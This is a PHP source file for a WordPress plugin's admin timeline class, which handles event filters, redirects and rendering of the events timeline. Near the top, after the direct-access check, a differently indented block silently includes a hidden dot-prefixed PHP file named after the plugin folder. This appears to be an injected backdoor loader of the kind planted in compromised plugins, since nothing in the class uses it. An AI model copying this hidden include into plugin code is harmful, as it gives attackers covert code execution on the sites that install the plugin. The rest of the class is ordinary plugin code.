<?php

/**
 * Events timeline class
 * 
 * The class handles timeline with events
 * 
 * @package     WPTAO/Admin/Timeline
 * @category    Admin
 */
// Exit if accessed directly
if ( !defined( 'ABSPATH' ) ) {
	exit;
}

if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class WTBP_WPTAO_Admin_Timeline {
	/*
	 * Action value ( URL ) of a timeline sorting form
	 */

	public $base_url;

	/*
	 * Raw data of the events
	 */
	private $events_data;

	/*
	 * Summary of a current filter
	 */
	public $summary_data;
	
		/*
	 * @var int
	 * @since 1.1.9
	 * Date ( timestamp )
	 */
	public $start_date;

	/*
	 * @var int
	 * @since 1.1.9
	 * Date ( timestamp )
	 */
	public $end_date;

	/*
	 * Sorting args
	 */
	private $sorting_args;
	

	/**
	 * WTBP_WPTAO_Admin_Timeline Constructor
	 * 
	 * 	@param stirng $base_url - base timeline URL ( used in links and a form action attribute )
	 *  @param array $events - result of the method get_events @see WTBP_WPTAO_Events::get_events
	 */
	function __construct( $base_url, $events = NULL ) {

		$args = TAO()->events->query_vars;

		$this->base_url = $base_url;

		if ( !isset( $events ) || !is_array( $events ) ) {

			$this->events_data = TAO()->events->get_events( $args );
		} else {
			$this->events_data = $events;
		}

		$args[ 'summary' ]	 = true;
		$args[ 'event_action' ]	 = ''; // Pass all actions
		$this->summary_data	 = TAO()->events->get_events( $args );

		$this->sorting_args = $this->events_query_args();
		$this->events_filter_redirect();
	}

	/*
	 * Receives query args of event filter
	 */

	private function events_query_args() {

		if ( isset( $_REQUEST[ 'wptao-event-filter-nonce' ] ) ) {

			$secure = wp_verify_nonce( $_REQUEST[ 'wptao-event-filter-nonce' ], 'wptao-event-filter' );

			if ( $secure ) {

				$query_args = array();

				// Receive categories
				if ( isset( $_REQUEST[ 'cat' ] ) && is_array( $_REQUEST[ 'cat' ] ) ) {
					$query_args[ 'cat' ] = implode( ',', $_REQUEST[ 'cat' ] );
				}

				// Receive tags
				if ( isset( $_REQUEST[ 'tags' ] ) && is_array( $_REQUEST[ 'tags' ] ) ) {

					$query_args[ 'tags' ] = implode( ',', $_REQUEST[ 'tags' ] );
				}

				// Receive actions
				if ( isset( $_REQUEST[ 'a' ] ) && is_array( $_REQUEST[ 'a' ] ) ) {
					$query_args[ 'a' ] = implode( ',', $_REQUEST[ 'a' ] );
				}

				// Receive start date
				if ( isset( $_REQUEST[ 'wptao-date-start' ] ) && !empty( $_REQUEST[ 'wptao-date-start' ] ) ) {
					$ts = strtotime( $_REQUEST[ 'wptao-date-start' ] );
					if ( $ts ) {
						$query_args[ 'ds' ] = WTBP_WPTAO_Helpers::set_time_of_day( $ts, 'begin' );
					}
				}

				// Receive start date
				if ( isset( $_REQUEST[ 'wptao-date-end' ] ) && !empty( $_REQUEST[ 'wptao-date-end' ] ) ) {
					$ts = strtotime( $_REQUEST[ 'wptao-date-end' ] );
					if ( $ts ) {
						$query_args[ 'de' ] = WTBP_WPTAO_Helpers::set_time_of_day( $ts, 'end' );
					}
				}
				
				// Date type
				if ( isset( $_REQUEST[ 'dr' ] ) && 'custom' === $_REQUEST[ 'dr' ] ) {
					$query_args[ 'dr' ] = 'custom';
				}
				
				// Receive sort by identification
				if ( isset( $_REQUEST[ 'wptao-show-by-ident' ] ) && !empty( $_REQUEST[ 'wptao-show-by-ident' ] ) ) {
					switch ( $_REQUEST[ 'wptao-show-by-ident' ] ) {
						case 'identified':
							$query_args[ 'identified' ]	 = '1';
							break;
						case 'unidentified':
							$query_args[ 'identified' ]	 = '0';
							break;
					}
				}

				// Events per page
				if ( isset( $_REQUEST[ 'wptao-events-number' ] ) && is_numeric( $_REQUEST[ 'wptao-events-number' ] ) ) {
					$ipp_new	 = $_REQUEST[ 'wptao-events-number' ] > 0 ? (int) $_REQUEST[ 'wptao-events-number' ] : false;
					$ipp_default = (int) TAO()->events->events_per_page;
					if ( $ipp_new !== FALSE && $ipp_default !== $ipp_new ) {
						$query_args[ 'ipp' ] = $ipp_new;

						// Save the user choice
						update_user_meta( get_current_user_id(), 'wptao_events_per_page', $ipp_new );
					}
				}

				return $query_args;
			}
		}

		return false;
	}

	/*
	 * Receives query args and redirect
	 */

	public function events_filter_redirect() {

		if ( !empty( $this->sorting_args ) && is_array( $this->sorting_args ) ) {

			$url = add_query_arg( $this->sorting_args, $this->base_url );

			wp_redirect( $url );
			exit();
		}
	}

	/**
	 * Output timeline filter form - HTML
	 * 
	 */
	public function the_timeline_filter() {

		// Filter template
		$filter_template = WTBP_WPTAO_DIR . "includes/admin/views/elements/timeline-filter.php";

		if ( file_exists( $filter_template ) ) {

			$filter = array(
				'actions'	 => TAO()->events->actions,
				'categories' => TAO()->events->events_categories(),
				'tags'		 => TAO()->events_tags->get_all_tags(),
			);
			
			include_once( $filter_template );
		}
	}

	/**
	 * Output timeline - HTML
	 */
	public function the_timeline() {

		// Timeline content section
		$timeline_template = WTBP_WPTAO_DIR . "includes/admin/views/elements/timeline.php";


		if ( file_exists( $timeline_template ) ) {

			$events = $this->prepare_events();

			include_once( $timeline_template );
		}
	}

	/*
	 * Prepare events data
	 * 
	 * @access private
	 * @return  object
	 */

	private function prepare_events() {

		$data = array();

		$events = $this->events_data;

		if ( isset( $events ) && !empty( $events ) ) {


			foreach ( $events as $event ) {

				// Allows to generate own event description.
				$text		 = '';
				$description = apply_filters( "wptao_event_{$event->action}_description", $text, $event );

				// Allows to generate own event title
				$title = apply_filters( "wptao_event_{$event->action}_title", $event->title, $event );

				$data[] = array(
					'event_id'		 => $event->id,
					'event_ts'		 => $event->event_ts,
					'category'		 => $event->category,
					'tags'			 => !empty( $event->tags ) ? explode( ',', $event->tags ) : array(),
					'action'		 => $event->action,
					'value'			 => $event->value,
					'meta'			 => $event->meta,
					'title'			 => $title,
					'description'	 => $description,
					'user'			 => isset( $event->user_id ) && absint( $event->user_id ) > 0 ? TAO()->user_profile->get_user( $event->user_id ) : NULL,
					'fingerprint_id' => $event->fingerprint_id
				);
			}
		}


		return $data;
	}

	/*
	 * Return timestamp of the first event
	 * 
	 * @return string timestamp
	 */

	public static function get_first_event_ts() {
		global $wpdb;

		$ts = time();

		$e		 = TAO()->events->table_name;
		$request = "SELECT event_ts FROM $e ORDER BY event_ts ASC";
		$results = $wpdb->get_var( $request );

		if ( !empty( $results ) ) {
			$ts = $results;
		}

		return $ts;
	}

}
